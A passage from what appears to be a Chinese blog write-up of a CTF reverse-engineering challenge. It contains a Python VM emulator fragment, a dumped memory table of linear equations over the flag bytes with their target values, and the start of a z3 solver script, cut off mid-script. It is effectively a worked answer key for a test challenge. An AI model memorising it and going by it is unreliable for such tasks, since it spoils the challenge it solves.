class="keyword">else</span>:</span><br><span class="line">            RIP += <span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(code[code[RIP+<span class="number">1</span>]] &lt;=<span class="number">0</span>):</span><br><span class="line">            RIP = code[RIP+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            RIP +=<span class="number">3</span></span><br><span class="line"><span class="comment"># print(code)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(code)):</span><br><span class="line">    print(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> -&gt;<span class="subst">&#123;code[i]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>运行完之后dump code，就能得到一系列方程组</p>
<p>如下</p>
<p>我之前是一步步尝试的，所以前8个flag字符就直接试出来了，然后还发现了方程组对应的值存在了98开始的内存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line">1020</span><br><span class="line">Sorry, wrong flag!</span><br><span class="line">0 -&gt;0</span><br><span class="line">1 -&gt;0</span><br><span class="line">2 -&gt;1070</span><br><span class="line">3 -&gt;16</span><br><span class="line">4 -&gt;208</span><br><span class="line">5 -&gt;16776140</span><br><span class="line">6 -&gt;15</span><br><span class="line">7 -&gt;0</span><br><span class="line">8 -&gt;1023</span><br><span class="line">9 -&gt;16</span><br><span class="line">10 -&gt;-1</span><br><span class="line">11 -&gt;1</span><br><span class="line">12 -&gt;16</span><br><span class="line">13 -&gt;1040</span><br><span class="line">14 -&gt;16777216</span><br><span class="line">15 -&gt;-16777216</span><br><span class="line">16 -&gt;16774200</span><br><span class="line">17 -&gt;1411</span><br><span class="line">18 -&gt;16776275</span><br><span class="line">19 -&gt;3646</span><br><span class="line">20 -&gt;1532</span><br><span class="line">21 -&gt;6451</span><br><span class="line">22 -&gt;2510</span><br><span class="line">23 -&gt;16777141</span><br><span class="line">24 -&gt;3*x10 - 4*x11 + 4*x12 - 13*x13 - 2*x14 - 7*x15 - 7*x8 - 2*x9 + 16777216</span><br><span class="line">25 -&gt;2*x10 + 5*x11 + 6*x12 - 10*x13 + 11*x14 - 3*x15 - 2*x8 + 3*x9</span><br><span class="line">26 -&gt;-3*x10 - 3*x11 + 4*x12 - 5*x13 - 2*x14 + 6*x15 - 2*x8 - 4*x9 + 16777216</span><br><span class="line">27 -&gt;-3*x10 + 5*x11 - 6*x12 + 17*x13 + 2*x14 + 7*x15 + 9*x8 + 3*x9</span><br><span class="line">28 -&gt;-x10 + 3*x11 + 6*x12 - 8*x13 + 9*x14 + 4*x15 - 2*x8 + 2*x9</span><br><span class="line">29 -&gt;-2*x10 + 13*x11 + 5*x12 + x13 + 20*x14 + 8*x15 + 6*x8 + 7*x9</span><br><span class="line">30 -&gt;-6*x10 + x11 - 8*x12 + 22*x13 - 6*x14 + 13*x15 + 9*x8 - x9</span><br><span class="line">31 -&gt;-8*x10 - 6*x11 - 5*x12 + 15*x13 - 11*x14 + 15*x15 + 5*x8 - 5*x9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">32 -&gt;-7*x16 - 2*x17 + 3*x18 - 4*x19 + 4*x20 - 13*x21 - 2*x22 - 7*x23 + 16777216</span><br><span class="line">33 -&gt;-2*x16 + 3*x17 + 2*x18 + 5*x19 + 6*x20 - 10*x21 + 11*x22 - 3*x23</span><br><span class="line">34 -&gt;-2*x16 - 4*x17 - 3*x18 - 3*x19 + 4*x20 - 5*x21 - 2*x22 + 6*x23</span><br><span class="line">35 -&gt;9*x16 + 3*x17 - 3*x18 + 5*x19 - 6*x20 + 17*x21 + 2*x22 + 7*x23</span><br><span class="line">36 -&gt;-2*x16 + 2*x17 - x18 + 3*x19 + 6*x20 - 8*x21 + 9*x22 + 4*x23</span><br><span class="line">37 -&gt;6*x16 + 7*x17 - 2*x18 + 13*x19 + 5*x20 + x21 + 20*x22 + 8*x23</span><br><span class="line">38 -&gt;9*x16 - x17 - 6*x18 + x19 - 8*x20 + 22*x21 - 6*x22 + 13*x23</span><br><span class="line">39 -&gt;5*x16 - 5*x17 - 8*x18 - 6*x19 - 5*x20 + 15*x21 - 11*x22 + 15*x23</span><br><span class="line"></span><br><span class="line">40 -&gt;-7*x24 - 2*x25 + 3*x26 - 4*x27 + 4*x28 - 13*x29 - 2*x30 - 7*x31 + 16777216</span><br><span class="line">41 -&gt;-2*x24 + 3*x25 + 2*x26 + 5*x27 + 6*x28 - 10*x29 + 11*x30 - 3*x31</span><br><span class="line">42 -&gt;-2*x24 - 4*x25 - 3*x26 - 3*x27 + 4*x28 - 5*x29 - 2*x30 + 6*x31</span><br><span class="line">43 -&gt;9*x24 + 3*x25 - 3*x26 + 5*x27 - 6*x28 + 17*x29 + 2*x30 + 7*x31</span><br><span class="line">44 -&gt;-2*x24 + 2*x25 - x26 + 3*x27 + 6*x28 - 8*x29 + 9*x30 + 4*x31</span><br><span class="line">45 -&gt;6*x24 + 7*x25 - 2*x26 + 13*x27 + 5*x28 + x29 + 20*x30 + 8*x31</span><br><span class="line">46 -&gt;9*x24 - x25 - 6*x26 + x27 - 8*x28 + 22*x29 - 6*x30 + 13*x31</span><br><span class="line">47 -&gt;5*x24 - 5*x25 - 8*x26 - 6*x27 - 5*x28 + 15*x29 - 11*x30 + 15*x31</span><br><span class="line"></span><br><span class="line">48 -&gt;-7*x32 - 2*x33 + 3*x34 - 4*x35 + 4*x36 - 13*x37 - 2*x38 - 7*x39 + 16777216</span><br><span class="line">49 -&gt;-2*x32 + 3*x33 + 2*x34 + 5*x35 + 6*x36 - 10*x37 + 11*x38 - 3*x39</span><br><span class="line">50 -&gt;-2*x32 - 4*x33 - 3*x34 - 3*x35 + 4*x36 - 5*x37 - 2*x38 + 6*x39</span><br><span class="line">51 -&gt;9*x32 + 3*x33 - 3*x34 + 5*x35 - 6*x36 + 17*x37 + 2*x38 + 7*x39</span><br><span class="line">52 -&gt;-2*x32 + 2*x33 - x34 + 3*x35 + 6*x36 - 8*x37 + 9*x38 + 4*x39</span><br><span class="line">53 -&gt;6*x32 + 7*x33 - 2*x34 + 13*x35 + 5*x36 + x37 + 20*x38 + 8*x39</span><br><span class="line">54 -&gt;9*x32 - x33 - 6*x34 + x35 - 8*x36 + 22*x37 - 6*x38 + 13*x39</span><br><span class="line">55 -&gt;5*x32 - 5*x33 - 8*x34 - 6*x35 - 5*x36 + 15*x37 - 11*x38 + 15*x39</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">56 -&gt;-7*x40 - 2*x41 + 3*x42 - 4*x43 + 4*x44 - 13*x45 - 2*x46 - 7*x47 + 16777216</span><br><span class="line">57 -&gt;-2*x40 + 3*x41 + 2*x42 + 5*x43 + 6*x44 - 10*x45 + 11*x46 - 3*x47</span><br><span class="line">58 -&gt;-2*x40 - 4*x41 - 3*x42 - 3*x43 + 4*x44 - 5*x45 - 2*x46 + 6*x47</span><br><span class="line">59 -&gt;9*x40 + 3*x41 - 3*x42 + 5*x43 - 6*x44 + 17*x45 + 2*x46 + 7*x47</span><br><span class="line">60 -&gt;-2*x40 + 2*x41 - x42 + 3*x43 + 6*x44 - 8*x45 + 9*x46 + 4*x47</span><br><span class="line">61 -&gt;6*x40 + 7*x41 - 2*x42 + 13*x43 + 5*x44 + x45 + 20*x46 + 8*x47</span><br><span class="line">62 -&gt;9*x40 - x41 - 6*x42 + x43 - 8*x44 + 22*x45 - 6*x46 + 13*x47</span><br><span class="line">63 -&gt;5*x40 - 5*x41 - 8*x42 - 6*x43 - 5*x44 + 15*x45 - 11*x46 + 15*x47</span><br><span class="line"></span><br><span class="line">64 -&gt;-7*x48 - 2*x49 + 3*x50 - 4*x51 + 4*x52 - 13*x53 - 2*x54 - 7*x55 + 16777216</span><br><span class="line">65 -&gt;-2*x48 + 3*x49 + 2*x50 + 5*x51 + 6*x52 - 10*x53 + 11*x54 - 3*x55</span><br><span class="line">66 -&gt;-2*x48 - 4*x49 - 3*x50 - 3*x51 + 4*x52 - 5*x53 - 2*x54 + 6*x55</span><br><span class="line">67 -&gt;9*x48 + 3*x49 - 3*x50 + 5*x51 - 6*x52 + 17*x53 + 2*x54 + 7*x55</span><br><span class="line">68 -&gt;-2*x48 + 2*x49 - x50 + 3*x51 + 6*x52 - 8*x53 + 9*x54 + 4*x55</span><br><span class="line">69 -&gt;6*x48 + 7*x49 - 2*x50 + 13*x51 + 5*x52 + x53 + 20*x54 + 8*x55</span><br><span class="line">70 -&gt;9*x48 - x49 - 6*x50 + x51 - 8*x52 + 22*x53 - 6*x54 + 13*x55</span><br><span class="line">71 -&gt;5*x48 - 5*x49 - 8*x50 - 6*x51 - 5*x52 + 15*x53 - 11*x54 + 15*x55</span><br><span class="line">72 -&gt;-7*x56 - 2*x57 + 3*x58 - 4*x59 + 4*x60 - 13*x61 - 2*x62 - 7*x63 + 16777216</span><br><span class="line">73 -&gt;-2*x56 + 3*x57 + 2*x58 + 5*x59 + 6*x60 - 10*x61 + 11*x62 - 3*x63</span><br><span class="line">74 -&gt;-2*x56 - 4*x57 - 3*x58 - 3*x59 + 4*x60 - 5*x61 - 2*x62 + 6*x63</span><br><span class="line">75 -&gt;9*x56 + 3*x57 - 3*x58 + 5*x59 - 6*x60 + 17*x61 + 2*x62 + 7*x63</span><br><span class="line">76 -&gt;-2*x56 + 2*x57 - x58 + 3*x59 + 6*x60 - 8*x61 + 9*x62 + 4*x63</span><br><span class="line">77 -&gt;6*x56 + 7*x57 - 2*x58 + 13*x59 + 5*x60 + x61 + 20*x62 + 8*x63</span><br><span class="line">78 -&gt;9*x56 - x57 - 6*x58 + x59 - 8*x60 + 22*x61 - 6*x62 + 13*x63</span><br><span class="line">79 -&gt;5*x56 - 5*x57 - 8*x58 - 6*x59 - 5*x60 + 15*x61 - 11*x62 + 15*x63</span><br><span class="line">80 -&gt;0</span><br><span class="line">81 -&gt;-7*x56 - 2*x57 + 3*x58 - 4*x59 + 4*x60 - 13*x61 - 2*x62 - 7*x63 + 16777216</span><br><span class="line">82 -&gt;-2*x56 + 3*x57 + 2*x58 + 5*x59 + 6*x60 - 10*x61 + 11*x62 - 3*x63</span><br><span class="line">83 -&gt;-2*x56 - 4*x57 - 3*x58 - 3*x59 + 4*x60 - 5*x61 - 2*x62 + 6*x63</span><br><span class="line">84 -&gt;9*x56 + 3*x57 - 3*x58 + 5*x59 - 6*x60 + 17*x61 + 2*x62 + 7*x63</span><br><span class="line">85 -&gt;-2*x56 + 2*x57 - x58 + 3*x59 + 6*x60 - 8*x61 + 9*x62 + 4*x63</span><br><span class="line">86 -&gt;6*x56 + 7*x57 - 2*x58 + 13*x59 + 5*x60 + x61 + 20*x62 + 8*x63</span><br><span class="line">87 -&gt;9*x56 - x57 - 6*x58 + x59 - 8*x60 + 22*x61 - 6*x62 + 13*x63</span><br><span class="line">88 -&gt;5*x56 - 5*x57 - 8*x58 - 6*x59 - 5*x60 + 15*x61 - 11*x62 + 15*x63</span><br><span class="line">89 -&gt;0</span><br><span class="line">90 -&gt;0</span><br><span class="line">91 -&gt;0</span><br><span class="line">92 -&gt;0</span><br><span class="line">93 -&gt;0</span><br><span class="line">94 -&gt;0</span><br><span class="line">95 -&gt;0</span><br><span class="line">96 -&gt;0</span><br><span class="line">97 -&gt;0</span><br><span class="line"></span><br><span class="line">0-7</span><br><span class="line">98 -&gt;16774200</span><br><span class="line">99 -&gt;1411</span><br><span class="line">100 -&gt;16776275</span><br><span class="line">101 -&gt;3646</span><br><span class="line">102 -&gt;1532</span><br><span class="line">103 -&gt;6451</span><br><span class="line">104 -&gt;2510</span><br><span class="line">105 -&gt;16777141</span><br><span class="line"></span><br><span class="line">8-15</span><br><span class="line">106 -&gt;16775256</span><br><span class="line">107 -&gt;2061</span><br><span class="line">108 -&gt;16776706</span><br><span class="line">109 -&gt;2260</span><br><span class="line">110 -&gt;2107</span><br><span class="line">111 -&gt;6124</span><br><span class="line">112 -&gt;878</span><br><span class="line">113 -&gt;16776140</span><br><span class="line"></span><br><span class="line">16-23</span><br><span class="line">114 -&gt;16775299</span><br><span class="line">115 -&gt;1374</span><br><span class="line">116 -&gt;16776956</span><br><span class="line">117 -&gt;2212</span><br><span class="line">118 -&gt;1577</span><br><span class="line">119 -&gt;4993</span><br><span class="line">120 -&gt;1351</span><br><span class="line">121 -&gt;16777040</span><br><span class="line"></span><br><span class="line">24-31</span><br><span class="line">122 -&gt;16774665</span><br><span class="line">123 -&gt;1498</span><br><span class="line">124 -&gt;16776379</span><br><span class="line">125 -&gt;3062</span><br><span class="line">126 -&gt;1593</span><br><span class="line">127 -&gt;5966</span><br><span class="line">128 -&gt;1924</span><br><span class="line">129 -&gt;16776815</span><br><span class="line"></span><br><span class="line">32-39</span><br><span class="line">130 -&gt;16774318</span><br><span class="line">131 -&gt;851</span><br><span class="line">132 -&gt;16775763</span><br><span class="line">133 -&gt;3663</span><br><span class="line">134 -&gt;711</span><br><span class="line">135 -&gt;5193</span><br><span class="line">136 -&gt;2591</span><br><span class="line">137 -&gt;16777069</span><br><span class="line"></span><br><span class="line">40-47</span><br><span class="line">138 -&gt;16774005</span><br><span class="line">139 -&gt;1189</span><br><span class="line">140 -&gt;16776283</span><br><span class="line">141 -&gt;3892</span><br><span class="line">142 -&gt;1372</span><br><span class="line">143 -&gt;6362</span><br><span class="line">144 -&gt;2910</span><br><span class="line">145 -&gt;307</span><br><span class="line"></span><br><span class="line">48-55</span><br><span class="line">146 -&gt;16775169</span><br><span class="line">147 -&gt;1031</span><br><span class="line">148 -&gt;16776798</span><br><span class="line">149 -&gt;2426</span><br><span class="line">150 -&gt;1171</span><br><span class="line">151 -&gt;4570</span><br><span class="line">152 -&gt;1728</span><br><span class="line">153 -&gt;33</span><br><span class="line"></span><br><span class="line">56-63</span><br><span class="line">154 -&gt;16775201</span><br><span class="line">155 -&gt;819</span><br><span class="line">156 -&gt;16776898</span><br><span class="line">157 -&gt;2370</span><br><span class="line">158 -&gt;1132</span><br><span class="line">159 -&gt;4255</span><br><span class="line">160 -&gt;1900</span><br><span class="line">161 -&gt;347</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所以z3直接解就行了</p>
<p>需要注意的是有些方程组左边和右边明显差距很大的，需要加一个16777216(找规律)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x0 = Int(<span class="string">&#x27;x0&#x27;</span>)</span><br><span class="line">x1 = Int(<span class="string">&#x27;x1&#x27;</span>)</span><br><span class="line">x2 = Int(<span class="string">&#x27;x2&#x27;</span>)</span><br><span class="line">x3 = Int(<span class="string">&#x27;x3&#x27;</span>)</span><br><span class="line">x4 = Int(<span class="string">&#x27;x4&#x27;</span>)</span><br><span class="line">x5 = Int(<span class="string">&#x27;x5&#x27;</span>)</span><br><span class="line">x6 = Int(<span class="string">&#x27;x6&#x27;</span>)</span><br><span class="line">x7 = Int(<span class="string">&#x27;x7&#x27;</span>)</span><br><span class="line">x8 = Int(<span class="string">&#x27;x8&#x27;</span>)</span><br><span class="line">x9 = Int(<span class="string">&#x27;x9&#x27;</span>)</span><br><span class="line">x10 = Int(<span class="string">&#x27;x10&#x27;</span>)</span><br><span class="line">x11 = Int(<span class="string">&#x27;x11&#x27;</span>)</span><br><span class="line">x12 = Int(<span class="string">&#x27;x12&#x27;</span>)</span><br><span class="line">x13 = Int(<span class="string">&#x27;x13&#x27;</span>)</span><br><span class="line">x14 = Int(<span class="string">&#x27;x14&#x27;</span>)</span><br><span class="line">x15 = Int(<span class="string">&#x27;x15&#x27;</span>)</span><br><span class="line">x16 = Int(<span class="string">&#x27;x16&#x27;</span>)</span><br><span class="line">x17 = Int(<span class="string">&#x27;x17&#x27;</span>)</span><br><span class="line">x18 = Int(<span class="string">&#x27;x18&#x27;</span>)</span><br><span class="line">x19 = Int(<span class="string">&#x27;x19&#x27;</span>)</span><br><span class="line">x20 = Int(<span class="string">&#x27;x20&#x27;</span>)</span><br><span class="line">x21 = Int(<span class="string">&#x27;x21&#x27;</span>)</span><br><span class="line">x22 = Int(<span class="string">&#x27;x22&#x27;</span>)</span><br><span class="line">x23 = Int(<span class="string">&#x27;x23&#x27;</span>)</span><br><span class="line">x24 = Int(<span class="string">&#x27;x24&#x27;</span>)</span><br><span class="line">x25 = Int(<span class="string">&#x27;x25&#x27;</span>)</span><br><span class="line">x26 = Int(<span class="string">&#x27;x26&#x27;</span>)</span><br><span class="line">x27 = Int(<span class="string">&#x27;x27&#x27;</span>)</span><br><span class="line">x28 = Int(<span class="string">&#x27;x28&#x27;</span>)</span><br><span class="line">x29 = Int(<span class="string">&#x27;x29&#x27;</span>)</span><br><span class="line">x30 = Int(<span class="string">&#x27;x30&#x27;</span>)</span><br><span class="line">x31 = Int(<span class="string">&#x27;x31&#x27;</span>)</span><br><span class="line">x32 = Int(<span class="string">&#x27;x32&#x27;</span>)</span><br><span class="line">x33 = Int(<span class="string">&#x27;x33&#x27;</span>)</span><br><span class="line">x34 = Int(<span class="string">&#x27;x34&#x27;</span>)</span><br><span class="line">x35 = Int(<span class="string">&#x27;x35&#x27;</span>)</span><br><span class="line">x36 = Int(<span class="string">&#x27;x36&#x27;</span>)</span><br><span class="line">x37 = Int(<span class="string">&#x27;x37&#x27;</span>)</span><br><span class="line">x38 = Int(<span class="string">&#x27;x38&#x27;</span>)</span><br><span class="line">x39 = Int(<span class="string">&#x27;x39&#x27;</span>)</span><br><span class="line">x40 = Int(<span class="string">&#x27;x40&#x27;</span>)</span><br><span class="line">x41 = Int(<span class="string">&#x27;x41&#x27;</span>)</span><br><span class="line">x42 = Int(<span class="string">&#x27;x42&#x27;</span>)</span><br><span class="line">x43 = Int(<span class="string">&#x27;x43&#x27;</span>)</span><br><span class="line">x44 = Int(<span class="string">&#x27;x44&#x27;</span>)</span><br><span class="line">x45 = Int(<span class="string">&#x27;x45&#x27;</span>)</span><br><span class="line">x46 = Int(<span class="string">&#x27;x46&#x27;</span>)</span><br><span class="line">x47 = Int(<span class="string">&#x27;x47&#x27;</span>)</span><br><span class="line">x48 = Int(<span class="string">&#x27;x48&#x27;</span>)</span><br><span class="line">x49 = Int(<span class="string">&#x27;x49&#x27;</span>)</span><br><span class="line">x50 = Int(<span class="string">&#x27;x50&#x27;</span>)</span><br><span class="line">x51 = Int(<span class="string">&#x27;x51&#x27;</span>)</span><br><span class="line">x52 = Int(<span class="string">&#x27;x52&#x27;</span>)</span><br><span class="line">x53 = Int(<span class="string">&#x27;x53&#x27;</span>)</span><br><span class="line">x54 = Int(<span class="string">&#x27;x54&#x27;</span>)</span><br><span class="line">x55 = Int(<span class="string">&#x27;x55&#x27;</span>)</span><br><span class="line">x56 = Int(<span class="string">&#x27;x56&#x27;</span>)</span><br><span class="line">x57 = Int(<span class="string">&#x27;x57&#x27;</span>)</span><br><span class="line">x58 = Int(<span class="string">&#x27;x58&#x27;</span>)</span><br><span class="line">x59 = Int(<span class="string">&#x27;x59&#x27;</span>)</span><br><span class="line">x60 = Int(<span class="string">&#x27;x60&#x27;</span>)</span><br><span class="line">x61 = Int(<span class="string">&#x27;x61&#x27;</span>)</span><br><span class="line">x62 = Int(<span class="string">&#x27;x62&#x27;</span>)</span><br><span class="line">x63 = Int(<span class="string">&#x27;x63&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># solver.add(x16 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x16 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x17 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x17 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x18 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x18 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x19 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x19 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x20 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x20 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x21 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x21 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x22 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x22 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x23 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x23 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x8 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x8 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x9 &gt;=32)</span></span><br><span 